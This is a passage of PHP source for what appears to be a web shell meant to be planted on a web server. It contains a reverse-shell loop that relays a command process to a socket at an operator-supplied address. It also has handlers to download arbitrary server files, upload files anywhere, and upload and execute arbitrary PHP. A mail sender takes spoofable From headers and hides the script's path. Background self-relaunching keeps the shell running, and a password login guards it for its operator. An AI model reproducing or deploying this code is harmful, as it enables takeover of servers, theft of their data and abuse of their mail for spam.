                        if(feof($sock)) {//Check stdout pipe is open else tell user socket is closed and exit While loop
                            LogTXT("ERROR: Reverse Shell connection to $ip:$port was terminated\n");
                            break;
                        }else{

                            touch($ClientLastConnectionfile);//Log that client is online
                        }
                    }else{//Read file
                        
                        
                        
                        
                        
                    }
                    
                    
                    if(file_exists($inputfile)) {                     //Pass STDIN
                        $val=file_get_contents($inputfile);
                        fwrite($pipes[0],$val);
                        @unlink($inputfile);
                    }
                    
                    if(!is_null($sock)){//Read socket
                        $dat=fread($sock,$chunk_size);
                        if($dat!=null){file_put_contents($inputfile,trim($dat).PHP_EOL);}
                    }
                    
                    
                    
                    if($size!=filesize($CMD_out)){//Read stdin
                        $section = file_get_contents($CMD_out, FALSE, NULL,$size,(filesize($CMD_out)-$size));
                        $msg=$section;if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    }
                    $size=filesize($CMD_out);
                    
                    
                    
                    if($size2!=filesize($CMD_err)){//Read stderr
                        $section = file_get_contents($CMD_err, FALSE, NULL,$size2,(filesize($CMD_err)-$size2));
                        $msg=$section;if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    }
                    $size2=filesize($CMD_err);
                    
                    
                    
                }
                fclose($pipes[0]);//Close pipes,socket,process
                KillProcess($pid);
                KillProcess($ppid);
                proc_close($process);
                
                if(!is_null($sock)){//If socket is created,close it
                    fclose($sock);
                    LogTXT("Reverse Shell connection to $ip:$port closed\n");
                }
                
                
                if(file_exists($CMD_out)){@unlink($CMD_out);}
                if(file_exists($CMD_err)){@unlink($CMD_err);}
                
                
                
            }else{//$process is not resource ==> failed to open cmd.exe
                $msg="Error: Failed To access cmd.exe.\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}//Message User if opening cmd.exe failed
                die();
            }
            
    }//End of cmd.exe handling codes
    
    
}


$Error_messages ="";
function ErrorHandler($errno, $errstr, $errfile, $errline) {//Function handling errors
    global $Error_messages;
    global $Error_num;
	global $debug;
    $Error_num+=1;
	if(strlen($Error_messages)>1024){//avoid $Error_messages Overflow!
		$Error_messages="";
	}
    $Error_messages.="Error $Error_num:$errstr;";
	if($debug){
	file_put_contents('logs.txt', "Error $Error_num:$errstr;Line $errline".PHP_EOL , FILE_APPEND);
	}
}





function DownloadFile(){//Download files from server to browser
    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
	
    if(!isset($_POST['d'])){
        $file="";
    }else{
        $file=$_POST['d'];
    }
    
    $type=@mime_content_type($file);
    header("Content-disposition: ".$type.";filename=".basename($file));
    header("Content-Type: ".$type."; charset=UTF-8");
    readfile($file);
    
    global $Error_messages;//Error_handler
    if($Error_messages!=""){
        header("Content-Type: text/error; charset=UTF-8");
        die($Error_messages);
    }
}


function pexec(){//Execute uploaded php file
    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
	
    @include($_FILES["file"]["tmp_name"]);
}



function Upload(){//Upload files on server
    
    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
	
	$upload_dir = '.'.DIRECTORY_SEPARATOR;
	
    if(isset($_POST['p']) && $_POST['p']!=""){
        
        $upload_dir=$_POST['p'];
        if(substr($upload_dir, -1)!=DIRECTORY_SEPARATOR){
            $upload_dir.=DIRECTORY_SEPARATOR;
        }
        
    }
    
    $target=$upload_dir.basename($_FILES['file']['name']);
    
    if(@!move_uploaded_file($_FILES['file']['tmp_name'],$target)) {
        
        header("Content-Type: text/error; charset=UTF-8");
        global $Error_messages;
        die($Error_messages);
        
        
    }
    
    
}



function generateRandomString($length) {//Generate random string
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


function SendMail(){//Send email

    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}

    ini_set('mail.add_x_header', 0);//Prevent leaking php filename and path if it is possible
    
    if(isset($_POST['from']) && $_POST['from']!=""){
        $from=$_POST['from'];
    }
    
    if(isset($_POST['to']) && $_POST['to']!=""){
        $to=$_POST['to'];
    }
    
    $subject="";
    if(isset($_POST['subject']) && $_POST['subject']!=""){
        $subject=$_POST['subject'];
    }
    
    $messagefile=$_POST['messagefile'];
    $message=file_get_contents($messagefile);
    $messagetype=mime_content_type($messagefile);
    
    $headers= "MIME-Version: 1.0\r\n";
    $headers.="From: $from\r\n";
    
    
    
    $replyto=$from;
    if(isset($_POST['replyto']) && $_POST['replyto']!=""){
        $replyto=$_POST['replyto'];
        
    }
    $headers.="Reply-To: $replyto\r\n";
    
    
    
    if(isset($_POST['cc'])){
        $cc=$_POST['cc'];
        $cc=explode(",",$cc);
        $cc=array_filter($cc);
        $cc=implode(", ",$cc);
        
        $headers .= "Cc: $cc\r\n";
    }
    
    if(isset($_POST['bcc'])){
        $bcc=$_POST['bcc'];
        $bcc=explode(",",$bcc);
        $bcc=array_filter($bcc);
        $bcc=implode(", ",$bcc);
        $headers .= "Bcc: $bcc\r\n";
    }
    
    $boundary = md5(generateRandomString(5));
    $headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n";
    
    //plain text
    $body= "--$boundary\r\n";
    $body.= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    $body.= "Content-Transfer-Encoding: base64\r\n\r\n";
    $body.= chunk_split(base64_encode($message));
    
    if(isset($_POST['attachmentfile']) && $_POST['attachmentfile']!=""){
        $file=$_POST['attachmentfile'];
        
        $encoded_content = chunk_split(base64_encode(file_get_contents($file)));
        
        $file_name=basename($file);
        $file_type=mime_content_type($file);
        $body.= "--$boundary\r\n";
        $body.="Content-Type: $file_type; name=".$file_name."\r\n";
        $body.="Content-Disposition: attachment; filename=".$file_name."\r\n";
        $body.="Content-Transfer-Encoding: base64\r\n";
        $body.="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n";
        $body.= $encoded_content;
    }
    mail($to, $subject,$body, $headers);
    
    global $Error_messages;
    if($Error_messages!=""){
        header("Content-Type: text/error; charset=UTF-8");
        die($Error_messages);
    }
    
}


function StartSession(){//Start session

	global $inputfile;
	global $outputfile;
	global $timerfile;
	global $pidfile;
	global $SIGKILLfile;
	global $ClientLastConnectionfile;
	global $Shell_Mode_file;
	global $Shell_Mode;
	global $CCD_file; 
	global $Welcome_message;
	global $OS_Version;
	global $User;
	global $OS;
	global $CMD_out;
	global $CMD_err;
	$Welcome_message="\nOperation System:$OS_Version\nUser:$User\n\n";
	
	$inputfile=".in.".HashMD5("anti-lfi");//File to store stdin input
    $outputfile=".out.".HashMD5("anti-lfi");//File to store process and script output
    $timerfile=".timer.".HashMD5("anti-lfi");//File to store the last date process was active
    $pidfile=".pid.".HashMD5("anti-lfi");//File to store pid of created process
    $SIGKILLfile=".SIGKILL.".HashMD5("anti-lfi");//file to ask killing process by creating it
    $ClientLastConnectionfile=".CLast.".HashMD5("anti-lfi");//File to store last date client visited the page
    $Shell_Mode_file=".mode.".HashMD5("anti-lfi");//File to save shell mode,Use proc_open for run-time shell or use SysExec for just executing commands
    $Shell_Mode='';
    $CCD_file='.ccd.'.HashMD5("anti-lfi");//File to save current directory choosen for shell mode

	//------------
	//Files to hanld CMD.exe stout and stderr on Windows
	if($OS=='windows'){
	  $CMD_out="results.".HashMD5("anti-lfi");
	  $CMD_err="error.".HashMD5("anti-lfi");		
	}
   //------------

    if(file_exists($outputfile)){@unlink($outputfile);}
	if(file_exists($inputfile)){@unlink($inputfile);}
	
	
    //Get current directory from ccd file;
	if(file_exists($CCD_file)){$dir=(trim(file_get_contents($CCD_file)));}else{$dir=getcwd();}	
	
	
    $_SESSION['loggedIn']=1;//we change 1 to 2 after sending hello message in CheckCSRF_Token() function
    $token=generateRandomString(25);//Geneate string with 25 random characters,use as csrf token.token is created by login and destroyed by logout
    $_SESSION['CSRF_TOKEN']=$token;
	header("CSRF_TOKEN: ".$token);
    SetDefaultShellMode(false);
    $msg=$Welcome_message."Current Working directory:$dir\nThis PHP file path:".__FILE__."\n\n\n";
    
	
	

	if($Shell_Mode!="proc_open"){
        $msg.="Warning:Shell mode is command_only.\nYou can't get run-time outputs or read stderr\nJust send your command to execute them\nor use command \"rv\" to get a reverse shell\n\n";
    }
    Logtxt($msg);
	TestShell();
    SetDefaultShellMode(true);
}


function CheckCSRF_Token(){
    




    
    if(!isset($_POST['token'])){//Token not sent
        LogTXT("You are under CSRF attack!\n");
        die();
        
    }else{
        
        $Sent_token=$_POST['token'];
        if($_SESSION['CSRF_TOKEN']!=$Sent_token){

			if($Sent_token!=""){//An invalid token is sent!
				//Someone trying fake tokens,die and don't continue.it's an attack!
				die();
		    }else{//User may loose CSRF_TOKEN by closing tab(not logging out) so we tell him what token is again!	
			    header("CSRF_TOKEN: ".$_SESSION['CSRF_TOKEN']);
			}
            
			
        }
        
    }
    
}


function IsSessionExistsAndIsValid(){//Check session is valid or not

    // start session if session is not already started
    if (session_status() !== PHP_SESSION_ACTIVE)
    {
        session_start();
    }
    
    if(!isset($_SESSION['loggedIn'])){
        return false;
    }
	
	global $inputfile;
	global $outputfile;
	global $timerfile;
	global $pidfile;
	global $SIGKILLfile;
	global $ClientLastConnectionfile;
	global $Shell_Mode_file;
	global $Shell_Mode;
	global $CCD_file; 
	global $Welcome_message;
	global $OS_Version;
	global $User;
	global $CMD_out;
	global $CMD_err;
	global $OS;
	$Welcome_message="\nOperation System:$OS_Version\nUser:$User\n\n";
	
	$inputfile=".in.".HashMD5("anti-lfi");//File to store stdin input
    $outputfile=".out.".HashMD5("anti-lfi");//File to store process and script output
    $timerfile=".timer.".HashMD5("anti-lfi");//File to store the last date process was active
    $pidfile=".pid.".HashMD5("anti-lfi");//File to store pid of created process
    $SIGKILLfile=".SIGKILL.".HashMD5("anti-lfi");//file to ask killing process by creating it
    $ClientLastConnectionfile=".CLast.".HashMD5("anti-lfi");//File to store last date client visited the page
    $Shell_Mode_file=".mode.".HashMD5("anti-lfi");//File to save shell mode,Use proc_open for run-time shell or use SysExec for just executing commands
    $Shell_Mode='';
    $CCD_file='.ccd.'.HashMD5("anti-lfi");//File to save current directory choosen for shell mode
	
	//------------
	//Files to hanld CMD.exe stout and stderr on Windows
	if($OS=='windows'){
	  $CMD_out="results.".HashMD5("anti-lfi");
	  $CMD_err="error.".HashMD5("anti-lfi");		
	}
   //------------



	
    return true;
    
}

function HashMD5($txt){
	global $salt;
	$hash=md5($txt.$salt);
	return $hash;
	
}

function HashSHA256($txt){//Generate SHA256 hashes
    global $salt;
    $hash=hash('sha256', $txt.$salt);
    return $hash;
}


function SavePasswordHash($password){//Save passwords
    if(IsSessionExistsAndIsValid()){
        global $Passwordfile;
        file_put_contents($Passwordfile,HashSHA256($password));
    }
}

function LoadPasswordHash(){//Load hash from file
    global $Passwordfile;
    if(!file_exists($Passwordfile)){
        return false;//No password is set yet
    }else{
        return file_get_contents($Passwordfile);
    }
}







function Logout(){//Logout
    global $ClientLastConnectionfile;
    if(IsSessionExistsAndIsValid()){
        session_destroy();
        session_unset();
        session_write_close();
        
        touch($ClientLastConnectionfile,100);//set client last visit file date to the past and make shell process to exit

        $txt="LoggedOut";
        die($txt);
    }else{
        header("Content-Type: text/error; charset=UTF-8");
        die("Login");
    }
}






function Login(){//Login
    if(IsSessionExistsAndIsValid()){//Session Is set and no problem.check password is set or Not...
        CheckCSRF_Token();
        if(isset($_POST['pass']) && isset($_POST['setpass'])){//If logged in and password isset and login= is not set means user wants password chang
            $pass=$_POST['pass'];
            if($pass!=""){
                SavePasswordHash($pass);
                $txt="NewPasswordSet";
                die($txt);
            }else{
                $txt="PasswordMustNotBeEmpty";
                header("Content-Type: text/error; charset=UTF-8");
                die($txt);
            }
        }
        
        if(!LoadPasswordHash()){//First Login.Set a password
            $txt="SetPassword";
            header("Content-Type: text/error; charset=UTF-8");
            die($txt);
        }
        
        //Session is Ok and Password is set.Logged in successfully:
        
        
    }else{//Not Valid session.Check password is set or not.if is not give session else ask password to login
        if(!LoadPasswordHash()){
            StartSession();
            return;
        }//Password is set and must be verified
        
        if(isset($_POST['pass'])){
            $pass=$_POST['pass'];
            if(HashSHA256($pass)==LoadPasswordHash()){
                StartSession();
            }else{
                header("Content-Type: text/error; charset=UTF-8");
                die("WrongPassword");//Password is wrong
            }
        }else{
            header("Content-Type: text/error; charset=UTF-8");
            die("PasswordParameterNeeded");//Password is not sent
        }
    }
}





function PreStartShell(){//Prepare variables to call StartShell() function
    
    $address='';
    $port='';
    $mode='';
    if($_POST['s']!="local"){
        
        
        
        $address=$_POST['s'];
        
        if(isset($_POST['p'])){
            $port=$_POST['p'];
        }
        
        $mode="socket";
        
        
        if(isset($_POST['ssl'])){
            $mode="ssl";
        }
        $command="php ".__FILE__." $mode $address $port  >/dev/null &";
        
        
    }else{
        $mode="local";
        $command="php ".__FILE__." $mode  >/dev/null &";
        
    }
    /*
     We can get php executable path on unix/Linux/Mac so we can use system function to run this script from CLI,
     (We run the shell handler from CLI to be more lucky to daemonise the script)
     But on Windows it's hard to get php.exe and daemonise the script so we call the function StartShell() directly;
     
     */
    SetDefaultShellMode(false);
    global $Shell_Mode;
    
    if($Shell_Mode=="proc_open"){//If proc_open available call StartShell()
        
        if($OS=="unix-linux-mac"){//Execute command on non-Windows operation systems
            set_time_limit(0);
            SysExec($command,false);
            
        }else{//On Windows,We Close the HTTP connection then call StartShell()
            StartShell($mode,$address,$port);
        }
        
    }else{//if mode is local warn user that we don't need for "start" command,if asking for reverse shell do it
        
        if($mode=="local"){
            LogTXT("Warning:Shell mode is command_only.\nYou can't get run-time outputs or read stderr\nJust send your command to execute them\nor use command \"rv\" to get a reverse shell\n\n");
        }else{//user asked reverse shell...
            StartShell($mode,$address,$port);
        }
        
    }
    
    
    die();
    
    
    
}

set_error_handler("ErrorHandler");//set ErrorHandler() function to handle errors

if (PHP_SAPI!='cli'){//Script is running from Web Server
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");//Prevent caching
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
}else{//Script is running from CLI
    
    
    $mode=$argv[1];                //Start shell
    if($argv[2]){$address=$argv[2];}
    if($argv[3]){$port=$argv[3];}
    
    if(file_exists($inputfile)){unlink($inputfile);}
    StartShell($mode,$address,$port);
    die();
    
}



if(isset($_POST['s'])){//Local shell/Or reverse shell
   Login();
   session_write_close();
   PreStartShell();

   die();
}elseif(isset($_POST['r'])){//Read ouptuts
    Login();

    session_write_close();
    ReadTXT();
    if(file_exists($outputfile)){@unlink($outputfile);}
    
    die();
}elseif(isset($_POST['c'])){//recieve command inputs
    Login();

    session_write_close();
    SendSTDIN();

    die();
}elseif(isset($_POST['k'])){//send killing signal to running cmd.exe/sh process
    Login();

    session_write_close();
    SendSIGKILL();

    die();
}elseif(isset($_POST['d'])){//download file to browser
    Login();

    session_write_close();
    DownloadFile();
    die();
}elseif(isset($_POST['p'])){//upload file to server
    Login();

    session_write_close();
    Upload();

    die();
}elseif(isset($_POST['from'])){//send email
    Login();

    session_write_close();
    SendMail();
    die();

}elseif(isset($_FILES['file'])){//Upload and execute a php file,delete it
    Login();

    session_write_close();
    pexec();
    die();


}elseif(isset($_POST['l'])){//Logout
    Login();

    Logout();
    @session_write_close();
    die();
}elseif(isset($_POST['cm'])){//change shell mode(proc_open/command_only)
    Login();

    session_write_close();
    ChangeShellMode();
    die();
}elseif(isset($_POST['ccd'])){//change current directly settings for functions like download,upload,shell,sendmail 
    Login();

    session_write_close();
    $output=CCD($_POST['ccd']);
	if($output!=""){LogTXT($output);}
    die();
}elseif(isset($_POST['cwd'])){//get current directory for functions like download,upload,shell,sendmail 
    Login();

    session_write_close();
    $output=cwd();
	if($output!=""){LogTXT($output);}
    die();
}







?><?php echo DIRECTORY_SEPARATOR;if($OS=="windows"){echo DIRECTORY_SEPARATOR;}?>